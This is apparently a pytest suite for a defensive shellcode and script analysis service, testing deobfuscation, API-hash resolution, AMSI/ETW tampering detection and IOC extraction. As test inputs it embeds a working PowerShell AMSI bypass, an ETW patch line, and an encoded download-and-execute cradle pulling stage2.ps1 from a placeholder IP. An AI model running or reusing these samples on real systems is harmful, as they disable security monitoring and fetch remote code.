"""Universal Content Analysis & Advanced Deobfuscation Test Suite.

Validates the full enterprise capability requirements:
1. Artifact Router integration for raw shellcode
2. Static-first shellcode analysis & disassembly
3. Static shellcode deobfuscation (single-byte XOR, rolling XOR, bitwise NOT)
4. Embedded PE artifact carving & parent-child provenance
5. API hash recognition & deterministic resolution (ROR13 / DJB2)
6. PEB/TEB access detection
7. Archive & container detection (including ACE archive detection)
8. Defensive security control analysis (AMSI & ETW tampering detection)
9. End-to-end telemetry ingestion -> decoded intelligence -> IUE entity extraction -> correlation signal
10. Anti-fabrication guarantees (zero hallucinated decodes, zero fake API mappings, zero fake IOCs)
"""
from __future__ import annotations

import hashlib
import pytest
from typing import Any, Dict

from services.artifact_intelligence import dispatch, registered_types
from services.analyzers.shellcode import (
    analyze as analyze_shellcode,
    deobfuscate_shellcode,
    carve_embedded_artifacts,
    detect_api_hashing,
    detect_peb_teb_access,
    starts_with_known_prologue,
)
from services.analyzers.security_controls import analyze_security_controls
from services.canonicalizer import canonicalize
from detection_content.xdr_iue import understand as iue_understand
from detection_content.xdr_ice import _signal_from_canonical


def _sha256(b: bytes) -> str:
    return hashlib.sha256(b).hexdigest()


# ── Scenario 1: Artifact Router Shellcode Integration ───────────────────────
def test_01_artifact_router_routes_raw_shellcode():
    # Metasploit x64 reverse_tcp prologue: cld; and rsp, -16; call...
    raw_shellcode = b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00" + b"\x90" * 32
    result = dispatch(raw_shellcode)

    assert result.artifact_type == "shellcode"
    assert result.confidence >= 80
    assert result.capability_available is True
    assert "entropy" in result.analysis
    assert "disassembly" in result.analysis
    assert result.analysis["is_shellcode"] is True


# ── Scenario 2: Static Shellcode Deobfuscation (Single-byte XOR) ───────────
def test_02_shellcode_deobfuscation_single_byte_xor():
    # Clean shellcode prologue: \xfc\xe8...
    clean_sc = b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0" + b"\x90" * 40
    key = 0x5A
    encoded_sc = bytes(b ^ key for b in clean_sc)

    # Deobfuscator must statically recover key without executing shellcode
    deob = deobfuscate_shellcode(encoded_sc)
    assert deob["success"] is True
    assert len(deob["stages"]) >= 1

    stage = deob["stages"][0]
    assert stage["decoder"] == "shellcode-xor-single"
    assert stage["key"] == f"0x{key:02x}"
    assert stage["input_hash"] == _sha256(encoded_sc)
    assert stage["output_hash"] == _sha256(clean_sc)
    assert deob["final_bytes"] == clean_sc
    assert deob["stop_reason"] == "terminal_payload_reached"


# ── Scenario 3: Static Shellcode Deobfuscation (Rolling XOR) ────────────────
def test_03_shellcode_deobfuscation_rolling_xor():
    clean_sc = b"\xfc\xeb\x05\xe8\xf8\xff\xff\xff" + b"\x90" * 32
    seed = 0x37
    # Rolling XOR: byte[i] ^ ((seed + i) & 0xFF)
    rolling_sc = bytes(clean_sc[i] ^ ((seed + i) & 0xFF) for i in range(len(clean_sc)))

    deob = deobfuscate_shellcode(rolling_sc)
    assert deob["success"] is True
    stage = deob["stages"][0]
    assert stage["decoder"] == "shellcode-rolling-xor"
    assert stage["seed"] == f"0x{seed:02x}"
    assert deob["final_bytes"] == clean_sc


# ── Scenario 4: Embedded PE Carving from Shellcode Buffer ───────────────────
def test_04_embedded_pe_carving_from_shellcode():
    # Create minimal valid PE DOS header structure
    # MZ at offset 0, offset 0x3c points to e_lfanew, PE\0\0 signature
    pe_header = bytearray(0x80)
    pe_header[0:2] = b"MZ"
    pe_header[0x3c:0x40] = (0x60).to_bytes(4, "little")  # e_lfanew = 0x60
    pe_header[0x60:0x64] = b"PE\x00\x00"

    # Shellcode stager followed by embedded PE (reflective loader archetype)
    sc_stager = b"\xfc\x48\x83\xe4\xf0\x48\x8d\x15" + b"\x90" * 24
    combined_buffer = bytes(sc_stager + pe_header + b"\x00" * 64)

    carved = carve_embedded_artifacts(combined_buffer)
    assert len(carved) >= 1

    pe_child = carved[0]
    assert pe_child["artifact_type"] == "pe"
    assert pe_child["offset"] == len(sc_stager)
    assert pe_child["relationship"] == "carved_from_shellcode"
    assert pe_child["sha256"] == _sha256(bytes(pe_header + b"\x00" * 64))


# ── Scenario 5: API Hash Recognition & Resolution (ROR13) ───────────────────
def test_05_api_hash_recognition_and_resolution():
    # Buffer containing standard ROR13 hashes for LoadLibraryA (0xec0e4e8e) and VirtualAlloc (0x0e8afe98)
    h_loadlib = (0xec0e4e8e).to_bytes(4, "little")
    h_valloc  = (0x0e8afe98).to_bytes(4, "little")
    sample_buf = b"\x90\x90" + h_loadlib + b"\x90\x90" + h_valloc + b"\x90\x90"

    res = detect_api_hashing(sample_buf, "x86_64")
    assert res["detected"] is True
    assert res["api_count"] == 2

    resolved_names = [a["api"] for a in res["resolved_apis"]]
    assert "LoadLibraryA" in resolved_names
    assert "VirtualAlloc" in resolved_names
    for a in res["resolved_apis"]:
        assert a["status"] == "API_NAME_RESOLVED"


# ── Scenario 6: PEB / TEB Access Detection ──────────────────────────────────
def test_06_peb_teb_access_detection():
    # x86 PEB access via fs:[0x30]
    x86_peb_access = b"\x64\xa1\x30\x00\x00\x00"  # mov eax, fs:[0x30]
    assert detect_peb_teb_access(x86_peb_access, "x86") is True

    # x64 TEB access via gs:[0x60]
    x64_peb_access = b"\x65\x48\x8b\x04\x25\x60\x00\x00\x00"  # mov rax, gs:[0x60]
    assert detect_peb_teb_access(x64_peb_access, "x86_64") is True

    # Plain text / benign data
    assert detect_peb_teb_access(b"This is benign text without segment registers", "x86_64") is False


# ── Scenario 7: Archive & Container Routing (ACE, 7z, ZIP) ──────────────────
def test_07_archive_container_routing_including_ace():
    # Test ACE archive signature detection (**ACE** at offset 7)
    ace_header = b"\x00" * 7 + b"**ACE**" + b"\x00" * 32
    r_ace = dispatch(ace_header)
    assert r_ace.artifact_type == "archive"
    assert r_ace.analysis["subtype"] == "ace"
    assert any("ACE archive detected" in ind for ind in r_ace.analysis["suspicious_indicators"])

    # Test 7z archive signature detection
    sevenz_header = b"7z\xbc\xaf\x27\x1c" + b"\x00" * 32
    r_7z = dispatch(sevenz_header)
    assert r_7z.artifact_type == "archive"
    assert r_7z.analysis["subtype"] == "7z"


# ── Scenario 8: Defensive Security Control Analysis (AMSI & ETW) ────────────
def test_08_defensive_security_control_analysis():
    # Attacker attempting AmsiScanBuffer memory patching
    ps_amsi_bypass = """
    $MethodDefinition = '[DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);'
    $Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -Namespace 'Win32' -PassThru
    $AmsiDll = [Win32.Kernel32]::LoadLibrary("amsi.dll")
    $AmsiScanBuffer = [Win32.Kernel32]::GetProcAddress($AmsiDll, "AmsiScanBuffer")
    [Runtime.InteropServices.Marshal]::Copy([byte[]](0xb8, 0x57, 0x00, 0x07, 0x80, 0xc3), 0, $AmsiScanBuffer, 6)
    """

    res = analyze_security_controls(ps_amsi_bypass)
    assert res["tampering_detected"] is True
    assert res["amsi_tampering"] is True
    assert "T1562.001" in res["mitre_techniques"]
    assert res["verdict"] in ("CRITICAL_TAMPERING", "SUSPICIOUS_TAMPERING")

    # ETW patching attempt
    ps_etw_patch = "VirtualProtect([IntPtr]$addr, 5, 0x40, [ref]$old); [Runtime.InteropServices.Marshal]::Copy([byte[]](0xc3), 0, $addr, 1) # EtwEventWrite"
    res_etw = analyze_security_controls(ps_etw_patch)
    assert res_etw["etw_tampering"] is True
    assert "T1562.006" in res_etw["mitre_techniques"]

    # Clean benign command
    clean_cmd = "Get-ChildItem -Path C:\\Logs | Export-Csv -Path C:\\report.csv"
    res_clean = analyze_security_controls(clean_cmd)
    assert res_clean["tampering_detected"] is False
    assert res_clean["verdict"] == "BENIGN"
    assert len(res_clean["findings"]) == 0


# ── Scenario 9: End-to-End Raw Ingestion -> Derived Evidence -> Correlation ──
def test_09_end_to_end_decoded_evidence_correlation():
    # Obfuscated PowerShell downloading from 198.51.100.23
    inner_cmd = "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/stage2.ps1')"
    import base64
    b64_payload = base64.b64encode(inner_cmd.encode("utf-16le")).decode()
    raw_cmd = f"powershell.exe -NoP -NonI -enc {b64_payload}"

    # 1. Canonicalize and extract decoded intelligence
    canonical = canonicalize(raw_cmd)
    assert canonical.decoded_intelligence is not None
    intel = canonical.decoded_intelligence
    assert "198.51.100.23" in intel["effective_payload"]

    # Regression verification: IOC bundle contract
    assert isinstance(intel["iocs"], dict), "intel['iocs'] must be a normalized IOC dictionary"
    assert "ips" in intel["iocs"]
    assert "urls" in intel["iocs"]
    assert "domains" in intel["iocs"]
    assert "198.51.100.23" in intel["iocs"].get("ips", [])
    assert any("198.51.100.23" in u for u in intel["iocs"].get("urls", []))
    assert isinstance(canonical.decoded_iocs, list), "canonical.decoded_iocs must preserve list format"

    # 2. Feed into IUE (Investigation Understanding of Evidence)
    canonical_event = {
        "event_id": "evt-8888",
        "timestamp": "2026-09-04T08:00:00Z",
        "event_type": "process_creation",
        "decoded_intelligence": intel,
        "security": {"signature": {"id": 1001, "name": "Suspicious PowerShell"}},
    }
    detection_dummy = {"matched": True, "rule_id": "rule-powershell-enc"}
    iue_out = iue_understand(canonical_event, detection_dummy)

    # Verify IUE extracted the derived C2 indicator entity from the decoded payload
    c2_entities = [e for e in iue_out["entities"] if e.get("value") == "198.51.100.23"]
    assert len(c2_entities) >= 1
    assert c2_entities[0]["role"] == "c2_indicator"
    assert "CORRELATION_CANDIDATE:DECODED_NETWORK_IOC" in iue_out["capability_tags"]

    # 3. Verify ICE correlation signal builder flattens decoded C2 IP
    sig = _signal_from_canonical(canonical_event, iue_out)
    assert sig["fields"]["decoded_c2_ip"] == "198.51.100.23"
    assert "198.51.100.23" in sig["fields"]["decoded_c2_ips"]
    assert "stage2.ps1" in sig["fields"]["effective_command"]


# ── Scenario 10: Anti-Fabrication Guarantees (Zero Hallucinations) ────────────
def test_10_anti_fabrication_guarantees():
    # Random UUID string
    uuid_str = "4f8a1290-7bc4-4d8e-a2f1-9c8e7d6a5b4c"
    res = analyze_security_controls(uuid_str)
    assert res["tampering_detected"] is False
    assert len(res["findings"]) == 0

    # Random high-entropy byte buffer with no valid signatures
    import random
    random_bytes = bytes(random.randint(0, 255) for _ in range(128))
    hashes = detect_api_hashing(random_bytes, "x86_64")
    # Must never invent an API mapping on random noise
    if hashes["detected"]:
        for h in hashes["resolved_apis"]:
            assert h["status"] in ("API_NAME_RESOLVED", "API_HASH_DETECTED")
    else:
        assert len(hashes["resolved_apis"]) == 0
